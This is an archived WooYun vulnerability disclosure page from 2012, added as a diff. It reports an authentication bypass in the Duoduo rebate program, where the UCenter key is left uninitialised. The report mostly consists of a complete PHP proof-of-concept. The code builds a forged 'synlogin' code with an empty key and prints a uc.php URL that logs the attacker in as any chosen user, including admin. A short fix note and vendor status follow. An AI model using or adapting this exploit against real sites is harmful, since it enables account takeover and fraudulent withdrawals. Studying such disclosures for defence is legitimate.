@@ -1,0 +1,284 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		多多返利程序，任意用户登录，甚至可以提现  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		多多返利程序，任意用户登录，甚至可以提现  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/fadhack">fadhack</a> 
+</li><li>提交时间：		2012-02-06 12:34</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-02-06：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2012-02-06：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">多多返利程序，任意用户登录，甚至可以提现！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://127.0.0.1/uc.php<br />
+<br />
+在后台未开启ucenter时候，存在典型的UC_key未初始化漏洞<br />
+<br />
+由于UCkey未初始化导致访问者可以随意调用uc接口的各种函数<br />
+<br />
+其中包括自动登陆 修改密码 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">poc：<br />
+<br />
+&lt;?php<br />
+<br />
+print_r(&#039;<br />
+<br />
+---------------------------------------<br />
+<br />
+UC_key Uninitialized Vul Exploit<br />
+<br />
+<br />
+<br />
+---------------------------------------<br />
+<br />
+&#039;);<br />
+<br />
+if ($argc &lt; 2) {<br />
+<br />
+print_r(&#039;<br />
+<br />
+Usage: php &#039;.$argv[0].&#039; username<br />
+<br />
+username: the admin username<br />
+<br />
+Example: php &#039;.$argv[0].&#039; admin<br />
+<br />
+&#039;);<br />
+<br />
+die();<br />
+<br />
+}<br />
+<br />
+error_reporting(0);<br />
+<br />
+$username = $argv[1];<br />
+<br />
+$key = &#039;&#039;;<br />
+<br />
+$code = &#039;time=11111111111&amp;username=&#039;.$username.&#039;&amp;action=synlogin&#039;;<br />
+<br />
+$x = urlencode(authcode($code, &quot;ENCODE&quot;, $key));<br />
+<br />
+print_r(&#039;Plz copy this code~~ enjoy it~~ ^_^<br />
+<br />
+/api/uc.php?code=&#039;.$x);<br />
+<br />
+function authcode($string, $operation = &#039;DECODE&#039;, $key = &#039;&#039;, $expiry = 0) {<br />
+<br />
+$ckey_length = 4;<br />
+<br />
+$key = md5($key ? $key : UC_KEY);<br />
+<br />
+$keya = md5(substr($key, 0, 16));<br />
+<br />
+$keyb = md5(substr($key, 16, 16));<br />
+<br />
+$keyc = $ckey_length ? ($operation == &#039;DECODE&#039; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#039;&#039;;<br />
+<br />
+$cryptkey = $keya.md5($keya.$keyc);<br />
+<br />
+$key_length = strlen($cryptkey);<br />
+<br />
+$string = $operation == &#039;DECODE&#039; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#039;%010d&#039;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;<br />
+<br />
+$string_length = strlen($string);<br />
+<br />
+$result = &#039;&#039;;<br />
+<br />
+$box = range(0, 255);<br />
+<br />
+$rndkey = array();<br />
+<br />
+for($i = 0; $i &lt;= 255; $i++) {<br />
+<br />
+$rndkey[$i] = ord($cryptkey[$i % $key_length]);<br />
+<br />
+}<br />
+<br />
+for($j = $i = 0; $i &lt; 256; $i++) {<br />
+<br />
+$j = ($j + $box[$i] + $rndkey[$i]) % 256;<br />
+<br />
+$tmp = $box[$i];<br />
+<br />
+$box[$i] = $box[$j];<br />
+<br />
+$box[$j] = $tmp;<br />
+<br />
+}<br />
+<br />
+for($a = $j = $i = 0; $i &lt; $string_length; $i++) {<br />
+<br />
+$a = ($a + 1) % 256;<br />
+<br />
+$j = ($j + $box[$a]) % 256;<br />
+<br />
+$tmp = $box[$a];<br />
+<br />
+$box[$a] = $box[$j];<br />
+<br />
+$box[$j] = $tmp;<br />
+<br />
+$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br />
+<br />
+}<br />
+<br />
+if($operation == &#039;DECODE&#039;) {<br />
+<br />
+if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {<br />
+<br />
+return substr($result, 26);<br />
+<br />
+} else {<br />
+<br />
+return &#039;&#039;;<br />
+<br />
+}<br />
+<br />
+} else {<br />
+<br />
+return $keyc.str_replace(&#039;=&#039;, &#039;&#039;, base64_encode($result));<br />
+<br />
+}<br />
+<br />
+}<br />
+<br />
+?&gt; </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">在后台未开启ucenter整合的时候，或者未启用的时候 删除uc.php<br />
+<br />
+<br />
+<br />
+启用的时候没有问题 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/fadhack" title="fadhack">fadhack</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-04248" title="多多返利程序，任意用户登录，甚至可以提现">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：10 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="4248";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
